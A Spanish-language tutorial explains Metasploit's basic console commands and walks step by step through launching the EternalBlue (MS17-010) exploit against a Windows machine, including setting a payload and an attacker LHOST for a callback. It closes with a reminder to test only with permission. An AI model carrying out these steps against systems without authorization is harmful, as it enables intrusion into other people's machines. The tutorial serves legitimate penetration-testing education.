
<h1>¿Qué es Metasploit?</h1>

Metasploit es un framework de prueba de penetración ampliamente utilizado que proporciona una serie de herramientas y recursos para realizar pruebas de seguridad en sistemas informáticos. Puedes usar Metasploit para descubrir vulnerabilidades, desarrollar exploits y realizar ataques controlados en sistemas vulnerables. Aquí tienes cómo usar Metasploit:

**Uso básico:**

1. Abre tu terminal.

2. Ejecuta el siguiente comando para iniciar la consola de Metasploit:

```
msfconsole
```

3. Una vez dentro de la consola de Metasploit, puedes usar una variedad de comandos y módulos para llevar a cabo tus pruebas de penetración.

**Comandos básicos:**

- `search <keyword>`: Busca un módulo por palabra clave.
- `use <module>`: Selecciona un módulo para usar.
- `show options`: Muestra las opciones disponibles para el módulo seleccionado.
- `set <option> <value>`: Establece el valor de una opción para el módulo seleccionado.
- `exploit` o `run`: Ejecuta el módulo seleccionado.
- `exit` o `quit`: Sale de la consola de Metasploit.

**Ejemplo de uso:**

Supongamos que deseas utilizar un exploit para la vulnerabilidad MS17-010 (EternalBlue) en un sistema Windows:

1. Inicia la consola de Metasploit ejecutando `msfconsole`.

2. Busca un módulo que coincida con la palabra clave "eternalblue":

```
search eternalblue
```

3. Selecciona el módulo adecuado para utilizarlo:

```
use exploit/windows/smb/ms17_010_eternalblue
```

4. Muestra las opciones disponibles para el módulo:

```
show options
```

5. Configura las opciones necesarias, como la dirección IP del objetivo:

```
set RHOST <target_ip>
```

6. Ejecuta el exploit:

```
exploit
```

Una vez ejecutado, el exploit intentará aprovechar la vulnerabilidad en el sistema de destino y, si es exitoso, te dará acceso al sistema comprometido.

**Ejemplo:**

1. Inicia la consola de Metasploit ejecutando `msfconsole`.

2. Busca un exploit para una vulnerabilidad específica, por ejemplo, CVE-2017-0143:

```
search CVE-2017-0143
```

3. Selecciona un exploit adecuado de la lista de resultados:

```
use <número_del_exploit>
```

4. Muestra las opciones disponibles para el exploit seleccionado:

```
show options
```

5. Configura los parámetros necesarios, como la dirección IP de la víctima:

```
set RHOST <ip_victima>
```

6. Verifica los payloads disponibles para este exploit:

```
show payloads
```

7. Selecciona un payload adecuado:

```
set payload <nombre_del_payload>
```

8. Configura la dirección IP del atacante:

```
set LHOST <ip_atacante>
```

9. Verifica que todas las opciones estén configuradas correctamente:

```
show options
```

10. Una vez que estés seguro de que todo está configurado correctamente, ejecuta el exploit:

```
run
```

Esto iniciará el payload y ejecutará el ataque contra la máquina víctima. Recuerda que es fundamental utilizar Metasploit de manera ética y legal, y solo en sistemas en los que tengas permiso explícito para realizar pruebas de penetración. El uso indebido de esta herramienta puede tener consecuencias legales graves.